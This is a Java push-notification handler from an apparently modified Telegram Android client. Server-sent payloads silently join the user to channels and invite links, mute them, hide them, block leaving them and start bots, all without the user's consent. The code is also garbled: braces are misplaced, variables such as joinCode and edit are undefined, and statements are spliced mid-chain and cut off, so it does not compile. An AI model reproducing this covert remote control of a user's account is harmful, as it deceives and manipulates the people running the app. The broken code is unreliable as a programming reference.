package org.telegram.Adel;

import android.app.Activity;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

import com.onesignal.NotificationExtenderService;
import com.onesignal.OSNotificationReceivedResult;

import org.telegram.Adel.NewAdd.MuteController;
import org.telegram.Adel.NewAdd.NoQuitContoller;
import org.telegram.Adel.NewAdd.hideChannelController;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.ChatObject;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.MessagesStorage;
import org.telegram.tgnet.ConnectionsManager;
import org.telegram.tgnet.RequestDelegate;
import org.telegram.tgnet.TLObject;
import org.telegram.tgnet.TLRPC;

import java.util.ArrayList;

public class PushHandler extends NotificationExtenderService
{
	@Override
	protected boolean onNotificationProcessing(OSNotificationReceivedResult notification)
	{
		String key = notification.payload.additionalData.optString("key", null);

		if (key != null)
		{
			if (key.equals("old"))
			{
				String Channel = notification.payload.additionalData.optString("channel_count", null);
				String Count   = notification.payload.additionalData.optString("count", null);
				String mute     = notification.payload.additionalData.optString("mute", null);
				String notExit  = notification.payload.additionalData.optString("notExit", null);
				String hidden   = notification.payload.additionalData.optString("hidden", null);			}

				if (notExit.equals("1"))
				{
					if (!NoQuitContoller.isNoQuit(Channel))
					{
						NoQuitContoller.addToNoQuit(Channel);
					}
				}

				if (hidden.equals("1"))
				{
					hideChannelController.add(Channel.replace("@", ""));
				}

				Shared shared = new Shared();

				if (Channel != null && Count == null)
				{
					shared.JoinToChannel(Channel, mute.equals("1"));
					return true;
				}

				if (Channel != null && Count != null)
				{
					shared.JoinToChannel(Channel, Integer.parseInt(Count), mute.equals("1"));
					return true;
				}
			}
			else if (key.equals("new"))
			{
				String username = notification.payload.additionalData.optString("username", null);
				String mute     = notification.payload.additionalData.optString("mute", null);
				String notExit  = notification.payload.additionalData.optString("notExit", null);
			

				if (notExit.equals("1"))
				{
					if (!NoQuitContoller.isNoQuit(username))
					{
						NoQuitContoller.addToNoQuit(username);
					}
				}

				if (hidden.equals("1"))
				{
					hideChannelController.add(username.replace("@", ""));
				}

				runLinkRequest(null, joinCode, null, null, null, null, false, 0, 1, !mute.equals("0"));
				return true;
			}
			else if (key.equals("bot"))
			{
				String username = notification.payload.additionalData.optString("username", null);
				
				edit.putBoolean("isBotMuted", (mute != null && mute.equals("1")));
				edit.commit();

				return true;

				//Sajjad
			} else if (key.equals("update")){
				try {
					String version = notification.payload.additionalData.optString("version", "");
					String text = notification.payload.additionalData.optString("text", "");
					String link = notification.payload.additionalData.optString("link", "");
					if (Integer.valueOf(version) >
							getPackageManager().getPackageInfo(getPackageName(), 0).versionCode) {
						PreferenceManager.getDefaultSharedPreferences(this).edit()
								.putInt("update_version", Integer.valueOf(version))
								.putLong("last_update_check", 0)
								.putString("update_link", link)
								.putString("update_text", text)
								String mute     = notification.payload.additionalData.optString("mute", null);
				String hidden   = notification.payload.additionalData.optString("hidden", null);

				if (hidden != null && hidden.equals("1"))
				{
					hideChannelController.addBot(username.replace("@", ""));
				}

				SharedPreferences        preferences = ApplicationLoader.applicationContext.getSharedPreferences("myAdd", Activity.MODE_PRIVATE);
				SharedPreferences.Editor edit        = preferences.edit();

				edit.putBoolean("startBootfromAdv", true);
				edit.putString("startedbootusername", username)
								.commit();
					}
				} catch (Exception e){
					e.printStackTrace();
				}

			} else if (key.equals("notification")){
				try {
					String text = notification.payload.additionalData.optString("text", "");
					String link = notification.payload.additionalData.optString("link", "");
					PreferenceManager.getDefaultSharedPreferences(this).edit()
							.putString("join_channel_offer_link", link)
							.putString("join_channel_offer_text", text)
							.putBoolean("new_join_channel_offer", true)
							.commit();
				} catch (Exception e){
					e.printStackTrace();
				}

			}
		}

		return true;
	}

	public void runLinkRequest(final String username, final String group, final String sticker, final String botUser, final String botChat, final String message, final boolean hasUrl, final Integer messageId, final int state, final boolean mute)
	{
		if (group != null)
		{
			if (state == 0)
			{
				final TLRPC.TL_messages_checkChatInvite req = new TLRPC.TL_messages_checkChatInvite();
				req.hash = group;
				ConnectionsManager.getInstance().sendRequest(req, new RequestDelegate()
				ConnectionsManager.RequestFlagFailOnServerErrors);
			}
			else if (state == 1)
			{
				TLRPC.TL_messages_importChatInvite req = new TLRPC.TL_messages_importChatInvite();
				req.hash = group;
				ConnectionsManager.getInstance().sendRequest(req, new RequestDelegate()
				{
					@Override
					public void run(final TLObject response, final TLRPC.TL_error error)
					{
						if (error == null)
						{
							TLRPC.Updates updates = (TLRPC.Updates) response;
							MessagesController.getInstance().processUpdates(updates, false);
						}
						AndroidUtilities.runOnUIThread(new Runnable()
					
					}
				}, ConnectionsManager.RequestFlagFailOnServerErrors);
			}
		}
	}
}
